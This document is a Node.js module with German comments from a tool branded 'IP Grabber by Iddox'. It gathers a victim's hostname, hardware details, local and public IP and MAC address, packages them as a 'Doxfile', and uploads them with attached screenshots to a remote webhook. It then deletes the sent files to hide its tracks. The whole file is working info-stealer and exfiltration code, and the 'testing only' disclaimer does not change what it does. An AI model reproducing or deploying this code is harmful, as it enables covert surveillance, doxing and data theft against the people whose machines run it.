require('dotenv').config(); // Lädt die .env-Datei und stellt so den Key zur Verfügung

/*
 * Modul: embed.js
 * Dieses Modul baut den Webhook-Payload auf und sendet ihn.
 * Created by @apt_start_latifi
 */

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');

// Ermittelt die öffentliche IP-Adresse
async function getPublicIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        console.error(`[ERROR] Öffentliche IP konnte nicht ermittelt werden: ${error.message}`);
        return 'N/A';
    }
}

// Baut den Payload gemäß deiner JSON-Vorlage auf
async function buildWebhookPayload(infoDict) {
    const publicIP = await getPublicIP();

    // Der Content ersetzt [TargetPublicIP] mit der ermittelten öffentlichen IP
    const content = `This Tool was created by @apt_start_latifi. **Use it only for testing or demonstration, not to harm people**\n\n## Doxfile for ${publicIP}`;

    // Erster Embed: System Infos
    const systemEmbed = {
        color: 6226102,
        fields: [
            {
                name: "Hostname",
                value: infoDict.hostname || "N/A"
            },
            {
                name: "CPU",
                value: infoDict.cpu || "N/A"
            },
            {
                name: "GPU",
                value: infoDict.gpu || "N/A"
            },
            {
                name: "Motherboard",
                value: infoDict.motherboard || "N/A"
            },
            {
                name: "System",
                value: infoDict.system || "N/A"
            },
            {
                name: "HardDisk",
                value: infoDict.harddisk || "N/A"
            },
            {
                name: "RAM",
                value: infoDict.ram || "N/A"
            }
        ],
        author: {
            name: "System Infos"
        }
    };

    // Zweiter Embed: Network Infos
    const networkEmbed = {
        color: 6226102,
        fields: [
            {
                name: "Local IP Address",
                value: infoDict.localIp || "N/A"
            },
            {
                name: "Public IP Adress",
                value: publicIP
            },
            {
                name: "Mac Address",
                value: infoDict.mac || "N/A"
            }
        ],
        author: {
            name: "Network Infos"
        },
        footer: {
            text: "Created by @apt_start_latifi | https://iddox.tech/"
        }
    };

    const payload = {
        content: content,
        embeds: [systemEmbed, networkEmbed],
        username: "IP Grabber by Iddox",
        attachments: []
    };

    return payload;
}

// Sendet den Payload inklusive eventueller Dateianhänge (z. B. Screenshots) an den Webhook
async function sendWebhook(webhookUrl, payload, filePaths) {
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify(payload));

    for (let i = 0; i < filePaths.length; i++) {
        const filePath = filePaths[i];
        if (fs.existsSync(filePath)) {
            formData.append(`file${i}`, fs.createReadStream(filePath), {
                filename: path.basename(filePath)
            });
        }
    }

    try {
        const response = await axios.post(webhookUrl, formData, {
            headers: formData.getHeaders()
        });

        if (response.status === 200 || response.status === 204) {
            console.log('[INFO] Webhook payload erfolgreich gesendet.');
            // Löscht nach dem Senden alle angehängten Dateien
            for (const filePath of filePaths) {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`[INFO] Datei gelöscht: ${filePath}`);
                }
            }
        } else {
            console.log(`[ERROR] ${response.status} - ${response.statusText}`);
        }
    } catch (error) {
        console.error(`[ERROR] ${error.message}`);
    }
}

module.exports = { buildWebhookPayload, sendWebhook };
